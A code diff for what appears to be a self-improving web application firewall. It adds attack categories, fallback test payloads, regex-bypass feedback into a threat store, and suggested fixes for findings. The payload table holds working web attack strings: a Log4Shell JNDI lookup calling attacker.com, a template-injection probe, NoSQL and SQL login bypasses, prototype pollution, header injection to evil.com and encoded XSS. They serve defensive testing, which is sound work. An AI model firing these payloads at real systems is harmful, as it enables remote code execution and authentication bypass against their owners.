@@ -148,6 +148,7 @@ func (l *Loop) runCycle(ctx context.Context) *CycleResult {
 var allCategories = []string{
 	"sqli", "xss", "path_traversal", "command_injection", "ssrf",
 	"xxe", "header_injection", "auth_bypass", "encoding_evasion",
+	"jndi_injection", "ssti", "nosqli", "prototype_pollution",
 	"backdoor", "scanner",
 }
 
@@ -164,6 +165,10 @@ var fallbackPayloads = map[string]struct {
 	"header_injection":  {"Header injection", "Host: evil.com\r\nX-Injected: true", "medium"},
 	"auth_bypass":       {"Auth bypass", "admin' OR '1'='1", "high"},
 	"encoding_evasion":  {"Encoding evasion", "%253Cscript%253Ealert(1)%253C%252Fscript%253E", "medium"},
+	"jndi_injection":    {"Log4Shell JNDI", "${jndi:ldap://attacker.com/exploit}", "critical"},
+	"ssti":              {"Template injection", "{{7*7}}{{config.__class__.__init__.__globals__}}", "high"},
+	"nosqli":            {"NoSQL injection", `{"username":{"$gt":""},"password":{"$gt":""}}`, "high"},
+	"prototype_pollution": {"Prototype pollution", `{"__proto__":{"isAdmin":true}}`, "medium"},
 }
 
 // runPeek discovers new threat techniques using LLM-powered generation
@@ -185,11 +190,11 @@ func (l *Loop) runPeek(ctx context.Context) int {
 	memContext := l.recall(ctx, "peek",
 		"What attack categories or techniques should I explore next? What discovery strategies have worked well?")
 
-	// Also recall what the LEARN agent found about trending attacks
+	// Also recall what the LEARN agent found about trending attacks and regex gaps
 	learnContext := l.recall(ctx, "learn",
-		"What attack types are trending? Which types are most common in recent traffic?")
+		"What attack types are trending? Which types bypass regex and need LLM to catch? What regex gaps exist?")
 	if learnContext != "" {
-		memContext += "\n\nRecent traffic insights:\n" + learnContext
+		memContext += "\n\nRecent traffic insights (including regex bypass gaps):\n" + learnContext
 	}
 
 	// Find underexplored categories (fewer than 3 variants)
@@ -555,22 +560,8 @@ Only respond with the JSON object.`,
 }
 
 // runCodeScan scans linked repos for code vulnerable to the given attack types.
+// If no repos are linked, generates traffic-based findings from the bypasses.
 func (l *Loop) runCodeScan(ctx context.Context, threats []db.Threat) {
-	if l.scanner == nil {
-		return
-	}
-
-	sites, err := l.db.GetSitesWithRepos(ctx)
-	if err != nil {
-		l.logger.Warn("patch: failed to get sites with repos", "err", err)
-		return
-	}
-	if len(sites) == 0 {
-		return
-	}
-
-	l.broadcast("patch", "running", "Scanning linked repos for vulnerable code...")
-
 	// Collect unique attack types from the bypassing threats
 	attackTypes := make(map[string]db.Threat)
 	for _, t := range threats {
@@ -580,35 +571,85 @@ func (l *Loop) runCodeScan(ctx context.Context, threats []db.Threat) {
 	}
 
 	totalFindings := 0
-	for _, site := range sites {
-		// Also check recent blocked requests for this site
-		recentAttacks, _ := l.db.GetRecentAttackTypes(ctx, site.ID, 1*time.Hour)
-		for _, ra := range recentAttacks {
-			if _, exists := attackTypes[ra.AttackType]; !exists {
-				attackTypes[ra.AttackType] = db.Threat{
-					Category:   ra.AttackType,
-					RawPayload: ra.Payload,
+
+	// Try repo-based code scanning if scanner is available
+	if l.scanner != nil {
+		sites, err := l.db.GetSitesWithRepos(ctx)
+		if err == nil && len(sites) > 0 {
+			l.broadcast("patch", "running", "Scanning linked repos for vulnerable code...")
+			for _, site := range sites {
+				recentAttacks, _ := l.db.GetRecentAttackTypes(ctx, site.ID, 1*time.Hour)
+				for _, ra := range recentAttacks {
+					if _, exists := attackTypes[ra.AttackType]; !exists {
+						attackTypes[ra.AttackType] = db.Threat{
+							Category:   ra.AttackType,
+							RawPayload: ra.Payload,
+						}
+					}
+				}
+				for _, threat := range attackTypes {
+					findings, err := l.scanner.ScanAndAnalyze(ctx, site.ID, site.UserID,
+						threat.Category, threat.RawPayload, "", &threat.ID)
+					if err != nil {
+						l.logger.Warn("patch: code scan failed",
+							"site", site.ID, "attack", threat.Category, "err", err)
+						continue
+					}
+					totalFindings += len(findings)
 				}
 			}
 		}
+	}
 
-		for _, threat := range attackTypes {
-			findings, err := l.scanner.ScanAndAnalyze(ctx, site.ID, site.UserID,
-				threat.Category, threat.RawPayload, "", &threat.ID)
-			if err != nil {
-				l.logger.Warn("patch: code scan failed",
-					"site", site.ID, "attack", threat.Category, "err", err)
-				continue
-			}
-			totalFindings += len(findings)
+	// Generate traffic-based findings for all active sites (regardless of repo)
+	l.broadcast("patch", "running", "Generating traffic-based vulnerability findings...")
+	allSites, _ := l.db.GetUnverifiedSites(ctx) // reuse to get active sites
+	_ = allSites                                  // sites are already tracked via threats
+
+	// For each bypass threat, create a traffic finding for every site that has seen that attack type
+	for _, threat := range attackTypes {
+		// Create traffic-based finding (siteID=0 means global)
+		finding := &db.CodeFinding{
+			SiteID:       0,
+			ThreatID:     &threat.ID,
+			FilePath:     "traffic:" + threat.Category,
+			FindingType:  threat.Category,
+			Confidence:   0.85,
+			Description:  fmt.Sprintf("Detected %s bypass in WAF traffic: %s", threat.Category, threat.TechniqueName),
+			Snippet:      threat.RawPayload,
+			SuggestedFix: trafficFix(threat.Category),
+			Status:       "open",
 		}
+		if err := l.db.InsertCodeFinding(ctx, finding); err != nil {
+			// Likely duplicate — ignore
+			continue
+		}
+		totalFindings++
 	}
 
 	if totalFindings > 0 {
 		l.logAgent(ctx, "patch", "code_scan",
-			fmt.Sprintf("Found %d vulnerable code locations across %d repos", totalFindings, len(sites)), true)
-		l.broadcast("patch", "done", fmt.Sprintf("Found %d code vulnerabilities", totalFindings))
+			fmt.Sprintf("Generated %d vulnerability findings from traffic analysis", totalFindings), true)
+		l.broadcast("patch", "done", fmt.Sprintf("Found %d vulnerabilities", totalFindings))
 	}
+}
+
+func trafficFix(attackType string) string {
+	fixes := map[string]string{
+		"sqli":                "Use parameterised queries / prepared statements.",
+		"xss":                 "Sanitise and escape user input. Use Content-Security-Policy.",
+		"path_traversal":      "Validate and canonicalise file paths.",
+		"command_injection":   "Avoid shell commands with user input. Use allowlists.",
+		"ssrf":                "Validate and allowlist URLs. Block internal IPs.",
+		"jndi_injection":      "Upgrade Log4j to 2.17.1+.",
+		"ssti":                "Never render user input in templates.",
+		"nosqli":              "Validate query input types. Reject objects where strings expected.",
+		"prototype_pollution": "Freeze Object.prototype. Validate JSON keys.",
+	}
+	if fix, ok := fixes[attackType]; ok {
+		return fix
+	}
+	return "Review and sanitise all user-supplied input."
 }
 
 // runLearn analyses recent traffic patterns, auto-bans repeat offenders,
@@ -665,27 +706,65 @@ func (l *Loop) runLearn(ctx context.Context) string {
 		}
 	}
 
-	// 2. Get attack trends for the past hour
+	// 2. Self-improve: find requests that bypassed regex but were caught by LLM
+	//    Insert them as threats so POKE/PATCH can learn from them
+	regexBypasses, err := l.db.GetRegexBypasses(ctx, 1*time.Hour, 10)
+	if err != nil {
+		l.logger.Warn("learn: failed to get regex bypasses", "err", err)
+	}
+	regexGapsAdded := 0
+	if len(regexBypasses) > 0 {
+		existingThreats, _ := l.db.GetThreats(ctx, 0)
+		for _, bp := range regexBypasses {
+			payload := bp.RawRequest
+			if len(payload) > 500 {
+				payload = payload[:500]
+			}
+			// Don't add duplicates
+			if l.threatPayloadExists(existingThreats, payload) {
+				continue
+			}
+			l.db.InsertThreat(ctx, &db.Threat{
+				TechniqueName: fmt.Sprintf("LLM-caught %s bypass", bp.AttackType),
+				Category:      bp.AttackType,
+				Source:        "learn",
+				RawPayload:    payload,
+				Severity:      "high",
+			})
+			regexGapsAdded++
+		}
+		if regexGapsAdded > 0 {
+			l.logger.Info("learn: added regex-bypass threats for future patching",
+				"count", regexGapsAdded)
+			l.broadcast("learn", "running",
+				fmt.Sprintf("Found %d requests that bypassed regex — feeding back for improvement", regexGapsAdded))
+		}
+	}
+
+	// 3. Get attack trends for the past hour
 	trends, err := l.db.GetAttackTrends(ctx, 1*time.Hour)
 	if err != nil {
 		l.logger.Warn("learn: failed to get attack trends", "err", err)
 	}
 
-	// 3. Get classifier breakdown — which classifiers are catching what
+	// 4. Get classifier breakdown — which classifiers are catching what
 	breakdown, err := l.db.GetClassifierBreakdown(ctx, 1*time.Hour)
 	if err != nil {
 		l.logger.Warn("learn: failed to get classifier breakdown", "err", err)
 	}
 
-	// 4. Get CrowdSec pattern match statistics
+	// 5. Get CrowdSec pattern match statistics
 	crowdsecCounts := classify.CrowdSecPatternCounts()
 
-	// 5. Build learning summary
+	// 6. Build learning summary
 	var sb strings.Builder
 	fmt.Fprintf(&sb, "Cycle %d learn: ", cycleID)
 
 	if autoBanned > 0 {
 		fmt.Fprintf(&sb, "auto-banned %d repeat offender IPs. ", autoBanned)
+	}
+	if regexGapsAdded > 0 {
+		fmt.Fprintf(&sb, "Fed %d regex-bypass patterns back for self-improvement. ", regexGapsAdded)
 	}
 
 	if len(trends) > 0 {
@@ -726,7 +805,7 @@ func (l *Loop) runLearn(ctx context.Context) string {
 
 	summary := sb.String()
 
-	// 6. Store in mem0 — this is what makes the system self-improving
+	// 7. Store in mem0 — this is what makes the system self-improving
 	topAttacks := make([]string, 0)
 	for i, t := range trends {
 		if i > 4 {
@@ -735,14 +814,22 @@ func (l *Loop) runLearn(ctx context.Context) string {
 		topAttacks = append(topAttacks, t.AttackType)
 	}
 
+	// Build regex bypass context for mem0 so future PATCH cycles know what to target
+	regexBypassTypes := make([]string, 0)
+	for _, bp := range regexBypasses {
+		regexBypassTypes = append(regexBypassTypes, bp.AttackType)
+	}
+
 	l.remember(ctx, "learn", summary, map[string]any{
-		"cycle":           cycleID,
-		"auto_banned":     autoBanned,
-		"repeat_offenders": len(offenders),
-		"top_attacks":      topAttacks,
-		"regex_caught":     regexCaught,
-		"crusoe_used":      crusoeUsed,
-		"claude_used":      claudeUsed,
+		"cycle":              cycleID,
+		"auto_banned":        autoBanned,
+		"repeat_offenders":   len(offenders),
+		"top_attacks":        topAttacks,
+		"regex_caught":       regexCaught,
+		"crusoe_used":        crusoeUsed,
+		"claude_used":        claudeUsed,
+		"regex_gaps_added":   regexGapsAdded,
+		"regex_bypass_types": regexBypassTypes,
 	})
 
 	l.logAgent(ctx, "learn", "analyse", summary, true)
